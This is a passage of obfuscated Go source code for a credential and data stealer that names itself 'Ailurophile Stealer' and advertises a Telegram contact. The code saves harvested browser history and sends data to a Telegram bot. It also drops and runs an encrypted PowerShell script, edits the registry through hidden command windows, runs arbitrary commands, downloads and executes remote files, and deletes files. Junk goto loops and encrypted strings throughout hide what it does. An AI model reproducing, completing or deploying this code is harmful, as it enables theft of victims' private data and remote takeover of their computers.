			historyFolderPath := filepath.Join(mainFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("ab090c6381eeb1850def2d0a696ec69f13d51cc14b635e"))
			nameFile := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c61352329db2bca024f5ef690ef6ba88d39385cb205875d1f8"), appName, path[1])
			if _, err := os.Stat(historyFolderPath); os.IsNotExist(err) {
				err := os.MkdirAll(historyFolderPath, 0777)
				if err != nil {
					continue
				}
			}

			historyFilePath := filepath.Join(historyFolderPath, nameFile)

			if _, err := os.Stat(historyFilePath); err == nil {
				err := os.Remove(historyFilePath)
				if err != nil {
					continue
				}
			}

			err := os.WriteFile(historyFilePath, []byte("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"+fmt.Sprint(historyEntries)), 0644)
			if err != nil {
				continue
			}
		}
	}

	return totalHistoryEntries
}
func kpsoqnqxaoelltlgvtfclvjqqezaptmd(botToken, chatID, message string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	telegramURL := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("8b140b679da6e7f731f9c7770f9385a12be365235e9455a2e65fe62624dab2892c9758e9a07d3e5fc069d41a9bb06e284f0156a483f33132b301"), botToken)

	data := url.Values{}
	data.Set(Cijosgmviuhoepbatohaaytukfezbopl("80081e63b1f5acf9a88a489fe89c40e707899cac9695f4"), chatID)
	data.Set(Cijosgmviuhoepbatohaaytukfezbopl("9705076359c1ca03c2d91087401d35562dbbdb5c"), message)
	data.Set(Cijosgmviuhoepbatohaaytukfezbopl("93010d648bc3a5b734ecddf3e323abfad4db3377ccf919841a23"), Cijosgmviuhoepbatohaaytukfezbopl("ab34325bc6c04196b094def1ae09b653fb3c3d67"))

	req, err := http.NewRequest(Cijosgmviuhoepbatohaaytukfezbopl("b32f2c43235a4638d679c7e3d5bfad7c66c6fc3e"), telegramURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8501167b8bf8e8ac3fa9cd2b1e979da16ce3613f059e54b1f31dac24189d790aeab00a4245f69a91dbbf8b0f"), err)
	}
	req.Header.Add(Cijosgmviuhoepbatohaaytukfezbopl("a00f11638bf2bcf504f0de3cf0d5520ae2ef9c13f5ff91abfbba149c"), Cijosgmviuhoepbatohaaytukfezbopl("82100f7b87ffa9ac39e6c07603db9eb33bbc622102960ab0bb51ec3c62c6f99f2d9f467bbc826964c6f2418af8f086b72a"))

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8501167b8bf8e8ac3fa9dd3c1592c9b629e0712b038f1de5ec4b8834e9030019b5866b5f62f74755730a"), err)
	}
	defer resp.Body.Close()

	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	response := buf.String()

	if resp.StatusCode != http.StatusOK {
		return response, fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("9705137289eea9b570c8fe105b848cb539f4773a509d46aca558ed7276c0e992698a48c5b17b3e0487297615ddae8a185e79780af2fc368a5f8dde"), resp.Status)
	}

	return response, nil
}
func jhdozevoyydvxpzquporhgxteffmizsi(filePath string) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if _, err := os.Stat(filePath); err == nil {
		err := os.Remove(filePath)
		if err != nil {
		}
	} else {
	}
}
func btcnjemyhvyexgpowyuziojnrrjszzll(folderPath string) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if _, err := os.Stat(folderPath); err == nil {

		err := filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() {
				return os.Remove(path)
			}
			return nil
		})
		if err != nil {
			return
		}

		err = os.RemoveAll(folderPath)
		if err != nil {
		} else {
		}
	} else {
	}
}
func xkndljmqbpqoqqvbbcqibnxbthxmjqqx() {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	scriptsPath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("b6101b769af9badb89bfdb410d03eedb48235e2d46dda6"))

	if _, err := os.Stat(scriptsPath); os.IsNotExist(err) {
		err := os.MkdirAll(scriptsPath, os.ModePerm)
		if err != nil {
			return
		}
	} else {
	}

	powershellScriptContent := Cijosgmviuhoepbatohaaytukfezbopl("e9440c749aecbcb070b48e7d368fa0aa3afe672f049248abe770f0116ec4f09b279d12f4a47a2534837e645eb526f9b5e33fd1d805af6bf1e886cd3e8a1b82f7455217be8cbf73e05271d1746ed085711adb85c63bedf6ce70ea1764ccd1e4b3f5d2ab57575ee6b95b73b6c39bf7546d1619210e0ab3bd688106a771dd3b5172c03a9839fb469170aa62c38b7f2edf36f336cb253ab6e21f8bafc514b8669243781d51836b89dd303eb791c6c8ea6953fb55230c7c44510f10b4b1f7fb509e4b5b06d3cfc7a8b233b8fb6a3445e0a5162addbfc37d8a75ee696ac6e0bca7eeccde89f8e08cfda4473e71c7294ab5c4379e3cc61a000845e5f5106547cfdd4d6c27ce99c4667da5dc7deeecc30e3981907696ebe31043d4470f047956760573c1488432ebb0294d6d39e93bfd49fb1bbfe27527edd4fd392770980f1fbb731237ae8d0c9345e145c07167dfd3f469ea5cf5cd0ae3b58a442f97c99b0176dd8761197456b2aca84445c043adf61aa626074dc23f07f1b1a6f3519397fe95c54e53aa449ead09527c783184357d7539f489996c590eb08212c19ab792201c57819d4ad12e19f87e6561dba32e74883fea40957e366d0e2654498412a13defce433e48b1c2de4f294fbb1dcfe1f87706e94f7250278a525af66538a6ab5a18c9d2e833721d762c1690b6d84a7654c3434f78e74053b29eb044030d99bae82928ff19e4d366bad054ddb003c7f7d490337603046d204b12302d8519f9472f22487d2ac9415d4c77aca31ec6f51dd205d3314479b903ffd5da1f15c79e64ffa1b37c83a76772ef5839ee9b07a2a47786c75b5ee8920890cafef9eaa1beb14e9a95812cd96b95f23340141de079b2cd9e41903b96c14e0e6241562ffafa6192f6b18a7137ec9eefe2bccbba008ec05d4c2e1fd2aa8ea17c79215506770705968742705407de50f6fdfe3e1d7dd1a1cea5fd8ebeedbc93f58575c137ce55bd9fb92afc57cacf8fd64da77f394a51e82c89eaa450d3e074a4f7edae1e318af6d0d9bd8725d7a1e27e9d97dfe0bb52af68b0db7be13bf63cfd99b217a33839abf3ac679439b7d0b917868ab5cc4e629b41c4473831d9b926755db2699fa606fa28019d82a5a40d7d4d5da0196735588c7c1ae6723d7d2e0bac3123b9671321122aa81354a216924dc26ff7cd94600b4a5368461b29d342e49540ad85f49853e13b992b67a540cad947017499629079dce5b9de6c64d28ed6f9528eca9d27012552d4b97ec0d81acf0829988ee2d14ba2575ba5c47ca7985cfd57ba6087bb3a2548b3719229838ef6865570127770c37f1d618e475b69ef8796e9208fef9740a34ddddf1bfa3d0f4847860d5c0cd274bcf87e41bc3282df156b2d6694e488ab97040160ab2817bf01dbc53cc01280127cd098f9f591956d68e0961fbb80c7f532d8a57508f9dce1c8d6d750c22ffa8746097f6e25d4b9ae7efdf84251f77260d1777e7e590d3c29873b0e45032b392d0ebce3183af6f8c0b79e9b02e40e467f4556a4f18a56d5137095c65149769690b80cc2c45cc8a1664b5d2c5787672b758aa3df56d99d96e278f5fda8abb817026891e73b83390bf00a30b39a15c121d88a8f7614a840f5939b1d02f0b6c43721828ecd5da5b4bb2cbe12c98150cc664f21bd056a78b8e01b0a39318c3550655b27f0ab7454c5de820b639948f92eadc0e40264606e968177856f0b1ac80d6ee21eac0e2c0e3f430025dd781ec9f6d458d0766d3f994b2c8b1c9e4339b350146474e55ad1570844c5fa925af915926177ae07cdcb7cecb75a23e0dd1714b962736107c42eabcaa872dba8b552df9f387bf397144a29981738b1de333b81f73bf36d0af75b3b0a50f69ffb9142babd53ef67483aa60fb7a44606522cc0604a90dd513802b536f55dfead486f9b95392546cdb21bec1397dcc846af2a0b21cde587f76ebcc2e9a3be7d228cfff35d6b2a79fc66e0e8a802b323537e0eb34a1db6731560b549e497772ae9ab9b589a9080ed29f6821c55835524570b0bf1b69b8d0af87e4ea9adf2cbe572fa60905aa9eb09dd02ac25e64fc42e246a2f1ca7b844e89b76ef94f8f9cc85f3f0308fb2b2c93715fd33cb9b97191a7b8869685081a31c1656240eba94457a417bcdea8a43702950839d9f6fdc3bd8af68b76cf4a68ece9971c9fe61f8c284f06b4510e62a03a9c8fda696eadb10e481394e5c6f53835fbd28db19d3327ede990b9487d45d78fbd3df22861c0d6a7d6d0238bf8dafd593446d25806b6792846dc6af0cbdba49fdaa7011671a93eabaa93c139c3152df86be73da01fdf880102e3dc9de30f48b85652942d81342954d04bd87a743906767ca6942d33848277072513cb0e51a61733d53e89b9b18933b379d32a92e4317ee41efdc5dba2d91b603b37d22a7cad50a3b082caa1f02f27d6b2b2c319a0aeebc5c8a3bfe467d914458e0dd1afbc3249d69c4baa7a6fe9edc9ac1ed7f2246c4940a05130bf0a48deb30f66cfdea1999eecf8147350e8793a1cb7b3503e6a7957d8478760a338fba6d45d91b33de53a26044de3b5dbf31cf221edbdb37e3d1d9998298b36dcd62e23afa7672829a15d26e361c0f231d283d0ae5919cfda1863f3bb36497996b8374fa182f2f034840a88ae999f7260042bf5b76d96b1a1b52d62db82a4f7a0458ffdec12af0aba7d675b7d2036b27d838b27771fe79934fc2945d5a42fa7b1550734cc6791d78a7a203b019f3b57b7f9e4c29a51b4604434c77cefe9183c334251207686fa3d4f5c63dc729fef6379af0ead097b991287522995a3cff83737cf1b3c7dd0c7fc2b82dcc4e6d37aec902a6922fb0baf9846d67fa27ec782e7ce4997281ce4c09b13e70b3415b1e8cfbf19982389880346246224ce66ad4deaf6a3dac34a69b5de16602c027d6aa9c30dea69d01bc16803e11e2f367508107e36c94a082f97e5b5f1a234e745d801aaa0d8937aef071e85bd276cf42a3a319d3dc4f00db95df5fc99609ad8387430476ab524d3e70884cbae3845bd47836c6be0d66c9786d30e09b63c5b4f567e61bc053df1cb88281114263de6f981dcadcfd048209cb40e4e77dda66846b363f8d55a2d4bba1157c2b0b18e0ac13c9bf9a399fd970507a7f62bff54492da605adc1028cdb8bf002bec566455f46975b2a313b6869297179c4396bcaa9cc1e1c81c5bdaf4bccea0acb2a86cbd23748d369527c6d45e8d2f9fe393312ecd964ce0e2de335b61f59541b7d7b603b0e1dd544b9b571ba45a20608a9cf0f24ca413783a5fa499e3a87c5246aff6683a958768cd2e51fc5cb2e14c495a655803a96dc1be688555b603225e1aaf299ab6eda9904074e7005d62043b3e56846b6b7498dbfb2c5921f33f33fd890a19118cbbf22ccb664d46a5a27e24e18d30e1a353940eb1afe4115f93385002f80d087f286e2dea4259d710c8e4b7d7cf06e775715a1f1334bd45209e1fbb5141c5738204a19d4fbbeb10cf0656dcd07c7af87bf01fc3b1a43e2fd318ed6987201d0f3051493758780825dd9c8bca84cf0653d87f5b27c5923ade35cc1d84fc5b2a477f401f0e482960c32ee94dfe9d4b10b2d9fd779908e6d2ccbb23b62507119a77c1099407bf2ccaa25400b9f96ada921b36b34147f52cb9391595cd6a76d6a49450e30601c1e934ca056fc95f6b68efdbbb29ffc04080e031a9784ba1fec63350aade0569a4662e1af4d9967d371687211aa738e865cbcb46bb0d5530fe2c314d38d202ab9a19558d6dce35a860736e97f8eee238c331e8ee5cbde30a3563f11eb92bf8df71f9d2142e64868549bd432a2a4f061b1fb783c51029633dfc26083f2c813e03ddeb5ed1baf65f9da7c75ea7922ca285fc54bf2b45f0bf78aa0635016568a495c74fe45dd6ffa906ad7cd5ea9d5a20e1cf4d96efbea32958969b59e024cbd19a00a838a2ae3427bc8806814a7fce3ab7d405d9413e128966d21f2bcb43057087027d82058313a9f6afca54c738067154b86300981b3664d9f407903d8de84d3e18df34a9aeb1050eef19fb15a6ab1a63e45d0f8952a4859b53df69e2070efdb83064b8c2d56b742840ae6fc74e087b9adba6872bea85d8a071a4d99dfdc9741205c09e7ecf58831499856eadb6716d9f1a770c183f23b7ebc81c1b97112178698adcc05b9ea093f526c1195a449df1bf397adc6fcfc065ff78861c942f213a856e2d8d4e0b5d7b115d635d1ad8fc293c208383d84a7e9798f2092d3251366225415d0c171f88b0002bdf0efbe3a7a371f4ad98ebf4b54ff5e6c808dbd2716de7db6e5cd013510a5b62ada7d3a038015a626dcbb78cb2fa00b831ac91e459c2e34326c153ca1110ac95d111426a60c0c6ac814c3db4b0eedeb9a3edfa0b555eab7a8f4f7a495853db5f3667c1d2b25cb91820c50b1b8f8c227213713a41afaa44aadbe61e1b512336f5f802b9f38eba717ba21e8154576b0402844499568a76f983cd55349a2675c3f7f2a75dc1eef33bd847154b10e05f8df89a31b7f664ebe10ff54bb67b2586f99768c5c8e5883403ceaeb58e9fcffc55793d14840375465384934ed4b22984064daf1dd5b0559bab7358c01bb17f49f3cfbf458951aaecec78a880c8b127ea089d1422e333547fec82c92a00044fbb79e0d3b278e995b55de7400764ec775b927fb1645cb597133d5e2f5003ccbac8af74428002ec40bf7b8b88b4e42edffa45d86c52f694fdfc6a3dd3e3f2ff92f9f47a83f5c97829163075c79caf593fac69f373df39b66f4c2caff7170d30c875e261463d4be33de7df0433aa1ecf21a8f494f99c3c")

	scriptFilePath := filepath.Join(scriptsPath, Cijosgmviuhoepbatohaaytukfezbopl("90030d7e9ee8e6a823b850ab585a5ec632d7def01d1f6611a280"))

	err := os.WriteFile(scriptFilePath, []byte(powershellScriptContent), os.ModePerm)
	if err != nil {
		return
	}

	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("930f08729cefa0bd3ce5aa34d5368f13166a0f402943e6aeaf4b"), Cijosgmviuhoepbatohaaytukfezbopl("ce2507728de9bcb13fe7fe36179f8abd57069ea536396e32209cf9331f5b131f"), Cijosgmviuhoepbatohaaytukfezbopl("a1190f769defce844741a4e04000b7acbba2d0c1eebe"), Cijosgmviuhoepbatohaaytukfezbopl("ce26167b8bf66ed5d4317aef95810ea846c52edbf6"), scriptFilePath)
	err = cmd.Run()
	if err != nil {
		return
	}
}

func gcpyzjxfxzisqnkebjnkmszxsmmhazew(regPath, name, value string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	command := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("b0141e659ab198aa3feacb2a08d6ceb423e6613c039342a9a51aa97f40dbfa8f249c52d089673e4a872b7755f23bb8fced709a9356a563e8ab88c6749a1dd6fc373f69d6e6c60d802478de6c6eb2932518efc38872d4fe9c3f892a64cce4b7f36deb55bb58c58a54f2b8a66b105565"), regPath, name, value)

	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("930f08729cefa0bd3ce5aa34d5368f13166a0f402943e6aeaf4b"), Cijosgmviuhoepbatohaaytukfezbopl("ce23107a83fda6bc495a19ac3d936b6eedc4927b79d6741e"), command)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err := cmd.Run()
	if err != nil {
		return err
	}

	fmt.Printf(Cijosgmviuhoepbatohaaytukfezbopl("b0151c748befbbbe25e5c2205b8399a02de5612a508942a2a04efd207893bddf3aa519d7cfcdea2f39cc2ba90eed9357865e4cbf77"), regPath, name)
	return nil
}
func pkyvandyzmprmnhvrlbcxlnpxttleutf(length int) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result[i] = charset[num.Int64()]
	}
	return string(result), nil
}

func ulkqmtusdhntfbcginmwvzjwjcdiodtq(args string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("930f08729cefa0bd3ce5aa34d5368f13166a0f402943e6aeaf4b"), Cijosgmviuhoepbatohaaytukfezbopl("ce23107a83fda6bc495a19ac3d936b6eedc4927b79d6741e"), args)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func Chvndzvvvesribbdchvxenxuuepsmqoa(url, filepath string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

func Dcjfsfhusmaolsolqdhhwgmejnpanjaz(filepath string) error {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	cmd := exec.Command(filepath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	return cmd.Run()
}

func Fanjhjvgwlhlwsgkmkczonclrgqtkozf() {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
